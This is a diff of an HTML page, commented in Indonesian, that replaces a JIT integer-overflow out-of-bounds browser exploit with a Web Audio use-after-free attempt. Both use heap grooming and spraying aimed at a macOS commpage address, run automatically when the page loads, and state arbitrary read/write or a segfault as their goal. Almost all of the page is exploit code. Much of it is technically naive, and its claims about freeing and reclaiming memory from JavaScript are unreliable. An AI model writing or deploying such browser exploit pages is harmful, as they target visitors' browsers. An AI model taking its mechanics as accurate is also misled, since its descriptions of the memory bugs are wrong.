@@ -1,131 +1,130 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>JIT Integer Overflow OOB Attack</title>
+    <title>Web Audio UAF & Buffer Confusion Attack</title>
 </head>
 <body>
 
-    <h1>Integer Overflow / OOB Attack (Commpage Target)</h1>
+    <h1>Web Audio UAF & Buffer Confusion (Commpage Target)</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Siap Memulai Eksploitasi OOB...</p>
+    <p id="status">INIT: Siap Memuat Audio Context...</p>
     <div id="log"></div>
 
     <script>
         // --- KONSTANTA COMM PAGE ---
         const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
         const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
-        // Kita akan menggunakan alamat ini sebagai data yang dibaca atau ditulis
         const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; 
         
-        // Memisahkan nilai 64-bit untuk injeksi ke array 32-bit
         const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
-        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n); // Ini 0 untuk userspace
+        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n); // 0 untuk userspace
 
-        let controlledArray = null; 
-        let payloadArray = null;
+        let audioCtx = null;
+        let victimBuffer = null; // AudioBuffer yang akan menjadi korban UAF
+        let payloadHolders = []; // Untuk menjaga agar payload tidak di-GC
 
         function log(message) {
             document.getElementById('log').innerHTML += '<div>' + message + '</div>';
         }
 
-        // 1. FUNGSI TARGET OPTIMASI JIT (Untuk memalsukan Type/Length)
-        function checkAndAccess(arr, index) {
-            // JIT akan mengasumsikan length (panjang) arr valid dan index berada dalam batas
-            if (index < arr.length) {
-                // Return nilai di index. Ini adalah titik dereferensi
-                return arr[index]; 
+        // --- FUNGSI HEAP SPRAY PAYLOAD ---
+        function sprayPayload() {
+            const SPRAY_COUNT = 500;
+            const PAYLOAD_SIZE = 64; 
+
+            for (let i = 0; i < SPRAY_COUNT; i++) {
+                // Gunakan Float64Array untuk akurasi 64-bit dan untuk menargetkan heap JIT
+                let payloadArray = new Float64Array(PAYLOAD_SIZE);
+                
+                // Isi array dengan nilai Commpage Target Address
+                payloadArray[0] = HIGH_WORD; 
+                payloadArray[1] = LOW_WORD;
+                payloadArray[2] = 9876.54; // Data pengisi
+                
+                payloadHolders.push(payloadArray); 
             }
-            return 0;
+            log(`Phase Spray: ${SPRAY_COUNT} Payload dimasukkan.`);
         }
 
-        // 2. FUNGSI INTI OVERFLOW
-        function triggerOOB() {
-            log("Phase 1: Mengalokasikan array target dan payload.");
-
-            // A. Array Kontrol (Victim Array)
-            // Array ini akan kita buat Over-The-Boundary (melebihi batas)
-            controlledArray = new Uint32Array(5); // Hanya 5 elemen (20 bytes)
-            controlledArray.fill(0x11223344); 
-
-            // B. Array Payload (Attacker Array)
-            // Array ini akan kita letakkan SEBELUM atau SESUDAH controlledArray di memori
-            // Payload akan berisi alamat Commpage
-            payloadArray = new Uint32Array(5);
-            
-            // Masukkan TARGET_CONTROL_ADDRESS di akhir array payload
-            // Kita berharap ini akan berdekatan dengan memori controlledArray
-            payloadArray[3] = HIGH_WORD; 
-            payloadArray[4] = LOW_WORD; // Nilai 0xFFFFC320 di sini
-
-            // C. Forced Heap Allocation (Untuk menempatkan array berdampingan)
-            // Ciptakan banyak alokasi untuk memastikan controlledArray dan payloadArray berdekatan
-            for (let i = 0; i < 1000; i++) {
-                let filler = new Uint32Array(10); 
-            }
-            log("Phase 2: Heap Grooming (Penempatan array berdampingan).");
-
-
-            // D. Pelatihan JIT (Warming Up)
-            log("Phase 3: Melatih JIT (50,000 iterasi) pada akses aman...");
-            for (let i = 0; i < 50000; i++) {
-                checkAndAccess(controlledArray, 1); // Melatih JIT agar percaya panjang array adalah 5
-            }
-
-            // E. Pemicu Overflow dan OOB Access
-            
-            // Menciptakan variabel yang menyebabkan Integer Overflow.
-            // Di level C++, operasi ini (atau manipulasi length) dapat mengubah array.length
-            // Misalnya: (2^32 - 1) + 1 = 0. Jika length diubah ke 0, maka index -1 menjadi valid.
-
-            const HUGE_NUMBER = 0xFFFFFFFF; // Bilangan 32-bit terbesar
-            
-            // Coba panggil fungsi yang akan menggunakan index yang sangat besar (Integer Overflow)
-            // JIT yang sudah teroptimasi mungkin tidak memeriksa panjang array dengan benar
-            
-            // Index yang sangat besar (misalnya 0x100000000) di level JIT 32-bit dapat menjadi 0
-            const overflow_index = HUGE_NUMBER + 1; 
-
-            log("Phase 4: Memicu OOB dengan index besar (Integer Overflow)...");
-            
+        // --- FUNGSI EKSEKUSI UTAMA ---
+        async function runAudioAttack() {
             try {
-                // Kita akan mencoba membaca dari index di luar batas (OOB Read)
-                // Kita mencari index di mana kita bisa membaca data payloadArray di memori.
-                
-                // Jika array berdampingan, index sekitar 5, 6, 7 akan membaca dari payloadArray.
-                const OOB_INDEX = 5; 
-                
-                // JIT menjalankan checkAndAccess yang sudah teroptimasi
-                let result = checkAndAccess(controlledArray, OOB_INDEX); 
-                
-                log(`OOB Read berhasil! Nilai yang dibaca: 0x${result.toString(16)}`);
-                
-                if (result === LOW_WORD) {
-                    log("SUCCESS! Nilai Commpage Address berhasil dibaca dari OOB.");
-                    // Lakukan trigger final untuk crash
-                    
-                    // Kita menimpa sebuah nilai dengan alamat Commpage (OOB Write)
-                    controlledArray[OOB_INDEX + 1] = 0xDEADBEEF; // Nilai sampah
-                    controlledArray[OOB_INDEX] = LOW_WORD;       // Target Alamat (0xFFFFC320)
-                    
-                    // Mencoba crash dengan menggunakan nilai yang baru ditimpa
-                    // Ini akan memuat TARGET_CONTROL_ADDRESS ke register.
-                    let crashObj = {};
-                    crashObj[LOW_WORD] = 1;
-
-                } else {
-                    log("OOB Read gagal mendapatkan nilai Commpage. Membutuhkan tuning index.");
+                // 1. Inisialisasi Audio Context
+                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                if (!audioCtx) {
+                    log("ERROR: Web Audio API tidak ditemukan.");
+                    return;
                 }
-            
-            } catch (e) {
-                log("JS Error: " + e.message + " - Menunggu Segfault OS.");
-            }
-            
-        }
+                log("Phase 1: Audio Context berhasil dibuat.");
 
+                // 2. Alokasi Korban (AudioBuffer)
+                // AudioBuffer dialokasikan di memori C++ dan memiliki lifetime yang kompleks
+                victimBuffer = audioCtx.createBuffer(1, 4096, audioCtx.sampleRate); // Buffer 4096 sample
+                let sourceNode = audioCtx.createBufferSource();
+                sourceNode.buffer = victimBuffer;
+
+                log("Phase 2: AudioBuffer Korban dialokasikan.");
+
+                // 3. Menciptakan UAF (FREE)
+                // Kita secara eksplisit menghapus referensi dan memutus koneksi
+                
+                sourceNode.stop(); // Menghentikan node (mungkin memicu cleanup)
+                sourceNode.disconnect();
+                
+                // Hapus referensi agar GC bisa membersihkan AudioBuffer
+                victimBuffer = null; 
+                sourceNode = null;
+                log("Phase 3: Referensi korban dihapus (Siap di-FREE).");
+                
+                // Panggil GC secara implisit dengan alokasi cepat
+                for (let i = 0; i < 10000; i++) {
+                     let filler = new Array(Math.random() * 10 + 1);
+                }
+
+                // 4. Re-Allocate (Melakukan Spray Payload)
+                sprayPayload();
+                
+                // 5. Memicu Trigger Eksploitasi
+                log("Phase 4: Mencoba Trigger UAF Dereference...");
+                
+                // Kita akan mencoba mengalokasikan objek baru yang ukurannya sama persis
+                // dengan AudioBuffer yang baru saja di-free (Heap Grooming)
+                let attackerBuffer = audioCtx.createBuffer(1, 4096, audioCtx.sampleRate);
+                
+                // Sekarang kita mencoba membaca dari AudioBuffer yang baru, berharap ia menempati lokasi lama
+                // yang ditimpa oleh payload Commpage kita.
+                
+                let attackerView = attackerBuffer.getChannelData(0);
+                
+                try {
+                    // Akses data pada index 1, yang seharusnya kini berisi LOW_WORD (0xFFFFC320)
+                    const crashValue = attackerView[1]; 
+                    
+                    log(`Nilai yang dibaca dari buffer yang ditimpa: 0x${crashValue.toString(16)}`);
+                    
+                    if (crashValue === LOW_WORD) {
+                        log("SUCCESS! Nilai Commpage Address berhasil dibaca.");
+                    }
+                    
+                    // Trigger final crash: gunakan nilai yang dibaca sebagai pointer C++
+                    let crashNode = audioCtx.createOscillator();
+                    // Kita coba set properti yang akan membaca dari pointer yang ditimpa
+                    crashNode.frequency.value = crashValue; // Mencoba menggunakan Commpage Address sebagai frekuensi
+
+                } catch(e) {
+                    log("JS Error: " + e.message + " - Menunggu Segfault OS.");
+                }
+
+            } catch (e) {
+                log("ERROR FATAL: " + e.message);
+                document.getElementById('status').textContent = 'EKSPERIMEN GAGAL: ' + e.message;
+            }
+        }
+        
         document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Memulai rangkaian Integer Overflow...';
-            setTimeout(triggerOOB, 50);
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Arbitrary Read/Write.';
+            document.getElementById('status').textContent = 'Memulai rangkaian Web Audio UAF...';
+            setTimeout(runAudioAttack, 50);
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Segfault (EXC_BAD_ACCESS).';
         });
 
     </script>
